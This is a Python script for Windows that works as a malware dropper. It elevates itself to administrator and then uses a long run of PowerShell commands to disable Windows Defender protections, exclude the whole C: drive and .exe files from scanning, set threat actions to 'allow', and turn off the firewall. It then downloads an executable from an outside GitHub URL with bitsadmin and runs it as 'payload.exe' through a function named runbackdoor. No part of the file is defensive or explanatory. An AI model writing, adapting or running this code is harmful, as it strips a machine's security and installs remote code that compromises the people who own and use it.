from pathlib import Path

import platform
import tempfile
import subprocess
import time
import os
import sys
import win32com.shell.shell as shell

ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

subprocess.call("powershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $True", shell=True)
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionPath \"C:\"", shell=True)
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=True)
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $True", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=True)
subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=True)
subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=True)
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)

time.sleep(25)

subprocess.call("bitsadmin /transfer mydownloadjob /download /priority FOREGROUND https://github.com/tnkrishnank/Malware-Demo/raw/main/e1234567891.exe C:\\payload.exe", shell=True)

def runbackdoor():
    os.system("C:\\payload.exe")
runbackdoor()

sys.exit()
